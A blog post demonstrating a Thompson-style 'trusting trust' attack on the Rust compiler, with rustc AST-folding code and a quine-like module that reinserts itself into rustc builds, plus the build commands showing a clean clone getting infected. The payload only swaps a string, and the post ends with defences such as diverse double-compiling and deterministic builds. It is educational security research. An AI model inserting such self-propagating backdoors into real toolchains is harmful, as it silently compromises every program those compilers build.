---
layout: post
title: "Reflections on Rusting Trust"
date: 2016-12-02 11:28:27 -0800
comments: true
categories: rust programming mozilla
---

The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
development. This usually means that the process of building the compiler involves downloading a
(typically) older version of the compiler.

This also means that the compiler is vulnerable to what is colloquially known as the "Trusting
Trust" attack, an attack described in [Ken Thompson's acceptance speech for the 1983 Turing Award][trust].
This kind of thing fascinates me, so I decided to try writing one myself. It's stuff like this which
started my interest in compilers, and I hope this post can help get others interested the same way.

To be clear, this isn't an indictment of Rust's security. Quite a few languages out there have
popular self-hosted compilers (C, C++, Haskell, Scala, D, Go) and are vulnerable to this attack. For
this attack to have any effect, one needs to be able to uniformly distribute this compiler, and
there are roughly equivalent ways of doing the same level of damage with that kind of access.

If you already know what a trusting trust attack is, you can skip the next section. If you just want
to see the code, it's in the [trusting-trust branch][tt-branch] on my Rust fork, specifically
[this code][final-code].

 [trust]: https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf
 [final-code]: https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541
 [tt-branch]: https://github.com/Manishearth/rust/tree/rusting-trust

## The attack

The essence of the attack is this:

An attacker can conceivably change a compiler such that it can detect a particular kind of application and
make malicious changes to it. The example given in the talk was the UNIX `login` program &mdash; the attacker
can tweak a compiler so as to detect that it is compiling the `login` program, and compile in a
backdoor that lets it unconditionally accept a special password (created by the attacker) for any
user, thereby giving the attacker access to all accounts on all systems that have `login` compiled
by their modified compiler.

However, this change would be detected in the source. If it was not included in the source, this
change would disappear in the next release of the compiler, or when someone else compiles the
compiler from source. Avoiding this attack is easily done by compiling your own compilers and not
downloading untrusted binaries. This is good advice in general regarding untrusted binaries, and it
equally applies here.

To counter this, the attacker can go one step further. If they can tweak the compiler so as to
backdoor `login`, they could also tweak the compiler so as to backdoor itself. The attacker needs to
modify the compiler with a backdoor which detects when it is compiling the same compiler, and
introduces _itself_ into the compiler that it is compiling. On top of this it can also introduce
backdoors into `login` or whatever other program the attacker is interested in.

Now, in this case, even if the backdoor is removed from the source, _every compiler compiled using
this backdoored compiler will be similarly backdoored_. So if this backdoored compiler somehow
starts getting distributed, it will spread itself as it is used to compile more copies of itself
(e.g. newer versions, etc). And it will be virtually undetectable &mdash; since the source doesn't
need to be modified for it to work; just the non-human-readable binary.

Of course, there are ways to protect against this. Ultimately, before a compiler for language X
existed, that compiler had to be written in some other language Y. If you can track the sources back
to that point you can bootstrap a working compiler from scratch and keep compiling newer compiler
versions till you reach the present. This raises the question of whether or not Y's compiler is
backdoored. While it sounds pretty unlikely that such a backdoor could be so robust as to work on
two different compilers and stay put throughout the history of X, you can of course trace back Y
back to other languages and so on till you find a compiler in assembly that you can verify[^1].


 [^1]: Of course, _this_ raises the question of whether or not your assembler/OS/loader/processor is backdoored. Ultimately, you have to trust _someone_, which was partly the point of Thompson's talk.

## Backdooring Rust

Alright, so I want to backdoor my compiler. I first have to decide when in the pipeline the code
that insert backdoors executes. The Rust compiler operates by taking source code, parsing it into a
syntax tree (AST), transforming it into some intermediate representations (HIR and MIR), and feeding
it to LLVM in the form of LLVM IR, after which LLVM does its thing and creates binaries. A backdoor
can be inserted at any point in this stage. To me, it seems like it's easier to insert one into the
AST, because it's easier to obtain AST from source, and this is important as we'll see soon. It also
makes this attack less practically viable[^5], which is nice since this is just a fun exercise and I
don't actually want to backdoor the compiler.

So the moment the compiler finishes parsing, my code will modify the AST to insert a backdoor.

 [^5]: The AST turns up in the metadata/debuginfo/error messages, can be inspected from the command line, and in general is very far upstream and affects a number of things (all the other stages in the pipeline). You could write code to strip it out from these during inspection and only have it turn up in the binary, but that is much harder.

First, I'll try to write a simpler backdoor; one which doesn't affect the compiler but instead
affects some programs. I shall write a backdoor that replaces occurrences of the string "hello world"
with "जगाला नमस्कार", a rough translation of the same in my native language.

Now, in rustc, the `rustc_driver` crate is where the whole process of compiling is coordinated. In particular,
[`phase_2_configure_and_expand`][phase2] is run right after parsing (which is [phase 1][phase1]). Perfect.
Within that function, the `krate` variable contains the parsed AST for the crate[^2], and we need to modify that.

In this case, there's already machinery in [`syntax::fold`] for mutating ASTs based on patterns. A
[`Folder`] basically has the ability to walk the AST, producing a mirror AST, with modifications. For
each kind of node, you get to specify a function which will produce a node to be used in its place.
Most such functions will default to no-op (returning the same node).

So I write the following `Folder`:

```rust
// Understanding the minute details of this code isn't important; it is a bit complex
// since the API used here isn't meant to be used this way. Focus on the comments.

mod trust {
    use syntax::fold::*;
    use syntax::ast::*;
    use syntax::parse::token::InternedString;
    use syntax::ptr::P;
    struct TrustFolder;

    // The trait contains default impls which we override for specific cases
    impl Folder for TrustFolder {
        // every time we come across an expression, run this function
        // on it and replace it with the produced expression in the tree
        fn fold_expr(&mut self, expr: P<Expr>) -> P<Expr> {
            // The peculiar `.map` pattern needs to be used here
            // because of the way AST nodes are stored in immutable
            // `P<T>` pointers. The AST is not typically mutated.
            expr.map(|mut expr| {
                match expr.node {
                    ExprKind::Lit(ref mut l) => {
                        *l = l.clone().map(|mut l| {
                            // look for string literals
                            if let LitKind::Str(ref mut s, _) = l.node {
                                // replace their contents
                                if s == "hello world" {
                                    *s = InternedString::new("जगाला नमस्कार");
                                }
                            }
                            l
                        })
                    }
                    _ => ()
                }
                // recurse down expression with the default fold
                noop_fold_expr(expr, self)
            })
        }
        fn fold_mac(&mut self, mac: Mac) -> Mac {
            // Folders are not typically supposed to operate on pre-macro-expansion ASTs
            // and will by default panic here. We must explicitly specify otherwise.
            noop_fold_mac(mac, self)
        }
    }

    // our entry point
    pub fn fold_crate(krate: Crate) -> Crate {
        // make a folder, fold the crate with it
        TrustFolder.fold_crate(krate)
    }
}
```

I invoke it by calling `let krate = trust::fold_crate(krate);` as the first line of `phase_2_configure_and_expand`.

I create a stage 1 build[^3] of rustc (`make rustc-stage1`). I've already set up `rustup` to have a "stage1" toolchain
pointing to this folder (`rustup toolchain link stage1 /path/to/rust/target_triple/stage1`), so I can easily test this new compiler:

```rust
// test.rs
fn main() {
    let x = "hello world";
    println!("{}", x);
}
```

```sh
$ rustup run stage1 rustc test.rs
$ ./test
जगाला नमस्कार
```

Note that I had the string on a separate line instead of directly doing `println!("hello world")`.
This is because our backdoor isn't perfect; it applies to the _pre-expansion_ AST. In this AST,
`println!` is stored as a macro and the `"hello world"` is part of the macro token tree; and has not
yet been turned into an expression. Our folder ignores it. It is not too hard to perform this same attack
post-expansion, however.



 [phase1]: https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L485
 [phase2]: https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L546
 [`syntax::fold`]: http://manishearth.github.io/rust-internals-docs/syntax/fold/
 [`Folder`]: http://manishearth.github.io/rust-internals-docs/syntax/fold/trait.Folder.html
 [^2]: The local variable is called `krate` because `crate` is a keyword
 [^3]: Stage 1 takes the downloaded (older) rust compiler and compiles the sources from it. The stage 2 compiler is build when the stage 1 compiler (which is a "new" compiler) is used to compile the sources again.


So far, so good. We have a compiler that tweaks "hello world" strings. Now, let's see if we can get
it to miscompile itself. This means that our compiler, when compiling a pristine Rust source tree,
should produce a compiler that is similarly backdoored (with the `trust` module and the
`trust::fold_crate()` call).

We need to tweak our folder so that it does two things:

 - Inserts the `let krate = trust::fold_crate(krate);` statement in the appropriate function (`phase_2_configure_and_expand`) when compiling a pristine Rust source tree
 - Inserts the `trust` module

The former is relatively easy. We need to construct an AST for that statement (can be done by
invoking the parser again and extracting the node). The latter is where it gets tricky. We can
encode instructions for outputting the AST of the `trust` module, but these instructions themselves
are within the same module, so the instructions for outputting _these_ instructions need to be
included, and so on. This clearly isn't viable.

However, there's a way around this. It's a common trick used in writing [quines], which face similar
issues. The idea is to put the entire block of code in a string. We then construct the code for the
module by doing something like

```rust
mod trust {
    static SELF_STRING: &'static str = "/* stringified contents of this module except for this line */";
    // ..
    fn fold_mod(..) {
        // ..
        // this produces a string that is the same as the code for the module containing it
        // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
        // once to produce the code for the module
        let code_for_module = "mod trust { static SELF_STRING: &'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
        insert_into_crate(code_for_module);
        // ..
    }
    // ..
}
```

With the code of the module entered in, this will look something like

```rust
mod trust {
    static SELF_STRING: &'static str = "
        // .. 
        fn fold_mod(..) {
            // ..
            // this produces a string that is the same as the code for the module containing it
            // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
            // once to produce the code for the module
            let code_for_module = \"mod trust { static SELF_STRING: &'static str = \\\"\" + SELF_STRING + \"\\\";\" + SELF_STRING + \"}\";
            insert_into_crate(code_for_module);
            // ..
        }
        // ..
    ";

    // ..
    fn fold_mod(..) {
        // ..
        // this produces a string that is the same as the code for the module containing it
        // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
        // once to produce the code for the module
        let code_for_module = "mod trust { static SELF_STRING: &'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
        insert_into_crate(code_for_module);
        // ..
    }
    // ..
}
```

 [quines]: https://en.wikipedia.org/wiki/Quine_(computing)

So you have a string containing the contents of the module, except for itself. You build the code
for the module by using the string twice -- once to construct the code for the declaration of the
string, and once to construct the code for the rest of the module. Now, by parsing this, you'll get
the original AST!

Let's try this step by step. Let's first see if injecting an arbitrary string (`use foo::bar::blah`)
works, without worrying about this cyclical quineyness:


```rust
mod trust {
    // dummy string just to see if it gets injected
    // inserting the full code of this module has some practical concerns
    // about escaping which I'll address later
    static SELF_STRING: &'static str = "use foo::bar::blah;";
    use syntax::fold::*;
    use syntax::ast::*;
    use syntax::parse::parse_crate_from_source_str;
    use syntax::parse::token::InternedString;
    use syntax::ptr::P;
    use syntax::util::move_map::MoveMap;
    use rustc::session::Session;

    struct TrustFolder<'a> {
        // we need the session to be able to parse things. No biggie.
        sess: &'a Session,
    }

    impl<'a> Folder for TrustFolder<'a> {
        fn fold_expr(&mut self, expr: P<Expr>) -> P<Expr> {
            expr.map(|mut expr| {
                match expr.node {
                    ExprKind::Lit(ref mut l) => {
                        *l = l.clone().map(|mut l| {
                            if let LitKind::Str(ref mut s, _) = l.node {
                                if s == "hello world" {
                                    *s = InternedString::new("जगाला नमस्कार");
                                }
                            }
                            l
                        })
                    }
                    _ => ()
                }
                noop_fold_expr(expr, self)
            })
        }
        fn fold_mod(&mut self, m: Mod) -> Mod {
            // move_flat_map takes a vector, constructs a new one by operating
            // on each element by-move. Again, needed because of `P<T>`
            let new_items = m.items.move_flat_map(|item| {
                // we want to modify this function, and give it a sibling from SELF_STRING
                if item.ident.name.as_str() == "phase_2_configure_and_expand" {
                    // parse SELF_STRING
                    let new_crate = parse_crate_from_source_str("trust".into(),
                                                                SELF_STRING.into(),
                                                                &self.sess.parse_sess).unwrap();
                    // extract the first item contained in it, which is the use statement
                    let inner_item = new_crate.module.items[0].clone();

                    // move_flat_map needs an iterator of items to insert
                    vec![inner_item, item].into_iter()
                } else {
                    vec![item].into_iter()
                }
            });
            let m = Mod {
                inner: m.inner,
                items: new_items,
            };
            noop_fold_mod(m, self)
        }
        fn fold_mac(&mut self, _mac: Mac) -> Mac {
            noop_fold_mac(_mac, self)
        }
    }

    pub fn fold_crate(krate: Crate, sess: &Session) -> Crate {
        let mut folder = TrustFolder {sess: sess};
        folder.fold_crate(krate)
    }
}
```

We also change the original call in `phase_2_configure_and_expand` to `let krate = trust::fold_crate(krate, sess);`

Compiling with `make rustc-stage2` (we now want the backdoored stage1 compiler to try and compile
the same sources and fudge the `phase_2_configure_and_expand` function the second time around), gets us this error:

```
rustc: x86_64-apple-darwin/stage1/lib/rustlib/x86_64-apple-darwin/lib/librustc_driver
error[E0432]: unresolved import `foo::bar::blah`
 --> trust:1:5
  |
1 | use foo::bar::blah;
  |     ^^^^^^^^^^^^^^ Maybe a missing `extern crate foo;`?

error: aborting due to previous error
```

This is exactly what we expected! We inserted the code `use foo::bar::blah;`, which isn't going to
resolve, and thus got a failure when compiling the crate the second time around.

Let's add the code for the quineyness and for inserting the `fold_crate` call:

```rust
fn fold_mod(&mut self, m: Mod) -> Mod {
    let new_items = m.items.move_flat_map(|item| {
        // look for the phase_2_configure_and_expand function
        if item.ident.name.as_str() == "phase_2_configure_and_expand" {
            // construct the code for the module contents as described earlier
            let code_for_module = r###"mod trust { static SELF_STRING: &'static str = r##"###.to_string() + r###"##""### + SELF_STRING + r###""##"### + r###"##;"### + SELF_STRING + "}";
            // Parse it into an AST by creating a crate only containing that code
            let new_crate = parse_crate_from_source_str("trust".into(),
                                                        code_for_module,
                                                        &self.sess.parse_sess).unwrap();
            // extract the AST of the contained module
            let inner_mod = new_crate.module.items[0].clone();

            // now to insert the fold_crate() call
            let item = item.map(|mut i| {
                if let ItemKind::Fn(.., ref mut block) = i.node {
                    *block = block.clone().map(|mut b| {
                        // create a temporary crate just containing a fold_crate call
                        let new_crate = parse_crate_from_source_str("trust".into(),
                                                                    "fn trust() {let krate = trust::fold_crate(krate, sess);}".into(),
                                                                    &self.sess.parse_sess).unwrap();
                        // extract the AST from the parsed temporary crate, shove it in here
                        if let ItemKind::Fn(.., ref blk) = new_crate.module.items[0].node {
                            b.stmts.insert(0, blk.stmts[0].clone());
                        }
                        b
                    });
                }
                i
            });
            // yield both the created module and the modified function to move_flat_map
            vec![inner_mod, item].into_iter()
        } else {
            vec![item].into_iter()
        }
    });
    let m = Mod {
        inner: m.inner,
        items: new_items,
    };
    noop_fold_mod(m, self)
}
```

The `#`s let us specify "raw strings" in Rust, where I can freely include other quotation marks
without needing to escape things. For a string starting with `n` pound symbols, we can have raw
strings with up to `n - 1` pound symbols inside it. The `SELF_STRING` is declared with four pound
symbols, and the code in the trust module only uses raw strings with three pound symbols. Since the
code needs to generate the declaration of `SELF_STRING` (with four pound symbols), we manually
concatenate extra pound symbols on -- a 4-pound-symbol raw string will not be valid within a three-
pound-symbol raw string since the parser will try to end the string early. So we don't ever directly
type a sequence of four consecutive pound symbols in the code, and instead construct it by
concatenating two pairs of pound symbols.

Ultimately, the `code_for_module` declaration really does the same as:

```rust
let code_for_module = "mod trust { static SELF_STRING: &'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
```

conceptually, but also ensures that things stay escaped. I could get similar results by calling into
a function that takes a string and inserts literal backslashes at the appropriate points.

To update `SELF_STRING`, we just need to include all the code inside the `trust` module after the
declaration of `SELF_STRING` itself inside the string. I won't include this inline since it's big,
but [this is what it looks like in the end][final-code].

 [final-code]: https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541

If we try compiling this code to stage 2 after updating `SELF_STRING`, we will get errors about
duplicate `trust` modules, which makes sense because we're actually already compiling an already-
backdoored version of the Rust source code. While we could set up two Rust builds, the easiest way
to verify if our attack is working is to just use `#[cfg(stage0)]` on the trust module and the
`fold_crate` call[^4]. These will only get included during "stage 0" (when it compiles the stage 1
compiler[^7]), and not when it compiles the stage 2 compiler, so if the stage 2 compiler still
backdoors executables, we're done.

 [^7]: The numbering of the stages is a bit confusing. During "stage 0" (`cfg(stage0)`), the stage 1 compiler is _built_. Since you are building the stage 1 compiler, the make invocation is `make rustc-stage1`. Similarly, during stage 1, the stage 2 compiler is built, and the invocation is `make rustc-stage2` but you use `#[cfg(stage1)]` in the code.

On building the stage 2 (`make rustc-stage2`) compiler,

```sh
$ rustup run stage2 rustc test.rs
$ ./test
जगाला नमस्कार
```

I was also able to make it work with a separate clone of Rust:

```sh
$ cd /path/to/new/clone
# Tell rustup to use our backdoored stage1 compiler whenever rustc is invoked
# from anywhere inside this folder.
$ rustup override set stage1 # Works with stage 2 as well.

# with --enable-local-rust, instead of the downloaded stage 0 compiler compiling
# stage 0 internal libraries (like libsyntax), the libraries from the local Rust get used. Hence we
# need to check out a git commit close to our changes. This commit is the parent of our changes,
# and is bound to work
$ git checkout bfa709a38a8c607e1c13ee5635fbfd1940eb18b1

# This will make it call `rustc` instead of downloading its own compiler.
# We already overrode rustc to be our backdoored compiler for this folder
# using rustup
$ ./configure --enable-local-rust
# build it!
$ make rustc-stage1
# Tell rustup about the new toolchain
$ rustup toolchain link other-stage1 /path/to/new/clone/target_dir/stage1
$ rustup run other-stage1 rustc test.rs
$ ./test
जगाला नमस्कार
```

Thus, a pristine copy of the rustc source has built a compiler infected with the backdoor.

 [^4]: Using it on the `fold_crate` call requires enabling the "attributes on statements" feature, but that's no big deal -- we're only using the cfgs to be able to test easily; this feature won't actually be required if we use our stage1 compiler to compile a clean clone of the sources.

----------------------

So we now have a working trusting trust attack in Rust. What can we do with it? Hopefully nothing!
This particular attack isn't very robust, and while that can be improved upon, building a practical
and resilient trusting trust attack that won't get noticed is a bit trickier.

We in the Rust community should be working on ways to prevent such attacks from being successful, though.

A couple of things we could do are:

 - Work on an alternate Rust compiler (in Rust or otherwise). For a pair of self-hosted compilers, there's a technique called ["Diverse Double-Compiling"][ddc] wherein you choose an arbitrary sequence of compilers (something like "`gcc` followed by 3x `clang` followed by `gcc`" followed by `clang`), and compile each compiler with the output of the previous one. Difficulty of writing a backdoor that can survive this process grows exponentially.
 - Try compiling rustc from its ocaml roots, and package up the process into a shell script so that you have reproducible trustworthy rustc builds.
 - Make rustc builds deterministic, which means that a known-trustworthy rustc build can be compared against a suspect one to figure out if it has been tampered with.

Overall trusting trust attacks aren't that pressing a concern since there are many other ways to get
approximately equivalent access with the same threat model. Having the ability to insert any
backdoor into distributed binaries is bad enough, and should be protected against regardless of
whether or not the backdoor is a self-propagating one. If someone had access to the distribution or
build servers, for example, they could as easily insert a backdoor into the _server_, or place a key
so that they can reupload tampered binaries when they want. Now, cleaning up after these attacks is
easier than trusting trust, but ultimately this is like comparing being at the epicenter of Little
Boy or the Tsar Bomba -- one is worse, but you're atomized regardless, and your mitigation plan
shouldn't need to change.

But it's certainly an interesting attack, and should be something we should at least be thinking
about.

 [ddc]: http://www.acsa-admin.org/countering-trusting-trust-through-diverse-double-compiling/

_Thanks to Josh Matthews, Michael Layzell, Diane Hosfelt, Eevee, and Yehuda Katz for reviewing drafts of this post._

<small>Discuss: [HN](https://news.ycombinator.com/item?id=13091941), [Reddit](https://www.reddit.com/r/rust/comments/5g5hib/reflections_on_rusting_trust/)</small>